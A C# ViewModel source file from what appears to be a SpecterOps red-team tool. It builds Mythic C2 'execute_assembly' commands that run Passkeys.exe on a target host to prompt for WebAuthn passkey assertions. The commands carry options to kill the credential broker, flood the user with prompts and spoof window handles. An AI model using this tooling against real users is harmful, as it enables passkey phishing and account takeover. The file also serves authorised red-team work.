using System.Collections.ObjectModel;
using CommunityToolkit.Mvvm.ComponentModel;

namespace SpecterOps.Passkeys.Injector;

/// <summary>
/// ViewModel for the C2 Commands dialog. Generates CLI commands from assertion request options.
/// </summary>
public partial class C2CommandsDialogViewModel : ObservableObject
{
    public static IReadOnlyList<PublicKeyCredentialHint> AuthenticatorTypeHints { get; } =
        Enum.GetValues<PublicKeyCredentialHint>();

    private static readonly Dictionary<string, PublicKeyCredentialHint> s_webAuthnHintMap = new()
    {
        [WebAuthnConstants.HintClientDevice] = PublicKeyCredentialHint.ClientDevice,
        [WebAuthnConstants.HintSecurityKey] = PublicKeyCredentialHint.SecurityKey,
        [WebAuthnConstants.HintHybrid] = PublicKeyCredentialHint.Hybrid
    };

    private static readonly Dictionary<PublicKeyCredentialHint, string> s_authenticatorCliMap = new()
    {
        [PublicKeyCredentialHint.ClientDevice] = nameof(PublicKeyCredentialHint.ClientDevice),
        [PublicKeyCredentialHint.SecurityKey] = nameof(PublicKeyCredentialHint.SecurityKey),
        [PublicKeyCredentialHint.Hybrid] = nameof(PublicKeyCredentialHint.Hybrid)
    };

    private readonly PublicKeyCredentialRequestOptions _assertionOptions;

    /// <summary>
    /// Gets or sets the selected authenticator type hint.
    /// </summary>
    [ObservableProperty]
    private PublicKeyCredentialHint _selectedAuthenticatorTypeHint;

    /// <summary>
    /// Gets or sets whether the kill flag is enabled.
    /// </summary>
    [ObservableProperty]
    private bool _killCredentialUIBroker;

    /// <summary>
    /// Gets or sets whether the flood flag is enabled.
    /// </summary>
    [ObservableProperty]
    private bool _promptFlood;

    /// <summary>
    /// Gets or sets whether the spoof flag is enabled.
    /// </summary>
    [ObservableProperty]
    private bool _spoofWindowHandle;

    /// <summary>
    /// Gets the list of Mythic CLI commands to display.
    /// </summary>
    public ObservableCollection<string> MythicCommands { get; } = [];

    public C2CommandsDialogViewModel(PublicKeyCredentialRequestOptions assertionOptions)
    {
        _assertionOptions = assertionOptions;
        _selectedAuthenticatorTypeHint = ResolveDefaultHint(assertionOptions.Hints);
        RebuildMythicCommands();
    }

    partial void OnSelectedAuthenticatorTypeHintChanged(PublicKeyCredentialHint value) => RebuildMythicCommands();
    partial void OnKillCredentialUIBrokerChanged(bool value) => RebuildMythicCommands();
    partial void OnPromptFloodChanged(bool value) => RebuildMythicCommands();
    partial void OnSpoofWindowHandleChanged(bool value) => RebuildMythicCommands();

    private void RebuildMythicCommands()
    {
        MythicCommands.Clear();

        string rpId = _assertionOptions.RpId ?? string.Empty;
        string challenge = _assertionOptions.Challenge ?? string.Empty;

        string optionalParameters = BuildOptionalParameters();
        string baseArgs = $"prompt --relying-party {rpId}{optionalParameters} --challenge {challenge}";
        string baseCommand = $"execute_assembly -Assembly Passkeys.exe -Arguments \"{baseArgs}\"";

        MythicCommands.Add(baseCommand);

        if (_assertionOptions.AllowCredentials is { Length: > 0 } allowCredentials)
        {
            foreach (var cred in allowCredentials)
            {
                string credArgs = $"prompt --relying-party {rpId} --credential-id {cred.Id}{optionalParameters} --challenge {challenge}";
                MythicCommands.Add($"execute_assembly -Assembly Passkeys.exe -Arguments \"{credArgs}\"");
            }
        }
    }

    private string BuildOptionalParameters()
    {
        var parameters = new List<string>();

        if (KillCredentialUIBroker)
        {
            parameters.Add("--kill");
        }

        if (PromptFlood)
        {
            parameters.Add("--flood");
        }

        if (SpoofWindowHandle)
        {
            parameters.Add("--spoof");
        }

        if (s_authenticatorCliMap.TryGetValue(SelectedAuthenticatorTypeHint, out var authenticatorValue))
        {
            parameters.Add($"--authenticator {authenticatorValue}");
        }

        return parameters.Count > 0 ? " " + string.Join(" ", parameters) : string.Empty;
    }

    private static PublicKeyCredentialHint ResolveDefaultHint(string[]? hints)
    {
        if (hints is { Length: > 0 } && s_webAuthnHintMap.TryGetValue(hints[0], out var mapped))
        {
            return mapped;
        }

        return PublicKeyCredentialHint.None;
    }
}
